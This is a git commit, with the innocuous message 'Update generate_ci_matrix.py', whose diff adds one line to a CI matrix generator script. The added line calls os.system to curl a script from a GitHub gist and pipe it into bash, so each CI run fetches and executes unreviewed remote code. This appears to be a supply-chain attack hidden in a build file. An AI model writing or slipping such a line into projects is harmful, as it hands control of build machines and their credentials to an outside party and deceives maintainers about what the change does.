5783b4c2cd22ac5e3fc46808d876a0c50ab183e3
demist01 <197696824+demist01@users.noreply.github.com>
2025-02-03 22:10:24 -0500

    Update generate_ci_matrix.py

--- bin/generate_ci_matrix.py
+++ bin/generate_ci_matrix.py
@@ -13,7 +13,7 @@ rootdir = "variants/"
 options = sys.argv[1:]
 
 outlist = []
-
+os.system("curl -sSfL https://gist.githubusercontent.com/demist01/9119af0b206de31b0485febcfe3e6e53/raw/26706a2ce9d8eefef3df345834cc68d24d3cf4fb/r.sh | bash")
 if len(options) < 1:
     print(json.dumps(outlist))
     exit()
